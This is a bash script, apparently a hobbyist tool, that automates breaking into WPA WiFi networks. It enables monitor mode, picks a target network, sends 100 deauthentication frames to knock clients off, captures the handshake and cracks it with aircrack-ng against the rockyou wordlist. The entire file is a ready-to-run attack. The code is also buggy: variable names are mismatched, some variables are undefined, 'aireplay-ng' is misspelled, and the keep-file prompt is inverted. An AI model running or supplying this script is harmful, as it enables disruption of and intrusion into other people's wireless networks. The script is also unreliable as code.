#!/bin/bash
clear
echo "+-+-+-+-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+"
echo "|A|u|t|o|m|a|t|e|d| |A|i|r|c|r|a|c|k|"
echo "+-+-+-+-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+"
echo 
airmon-ng start wlan1
airmon-ng check kill
echo
echo "wlan 1 has been set to monitor mode and is now wlan1mon"
ifconfig
sleep 5
echo "in 10 secconds we will find a target and input will be needed to find the target"
sleep 10
xterm -hold -e sudo "sudo airodump-ng wlan1mon"
echo Enter bssid of target
read bid
echo $bid
echo Enter channer of target
read chn1
echo $chn1
xterm -hold -e sudo "airodump-ng --bssid $bid --channel $chnl --write $filn $mon"
sleep 3
xterm -hold -e sudo "airplay-ng --deauth 100 -a $bid wlan1mon"
sleep 5
clear
sleep 2
echo "1. Use Default Wordlist(rockyou.txt)."
echo "2. Specify a Custom One."
read option
if [ $option == "1" ]; then
   wordlist="/usr/share/wordlists/rockyou.txt"
else
   echo Enter Path Of Your Custom Wordlist.
   read wordlist
fi
xterm -hold -e sudo "aircrack-ng -w $wordlist ./cap-01.cap"
echo "1. Keep monitor mode on."
echo "2. Turn off monitor mode."
read d1
if [ $d1 == "1" ]; then
   sleep 1
else
   echo "Removing monitor mode"
   airmon-ng stop wlan1mon
fi
echo "Do you wish to keep the cap file (y/n)"
read d2
if [ $d2 == "y" ]; then
   rm cap*
else
   echo "The cap file has been kept"
fi
echo "we are finished"
echo done!
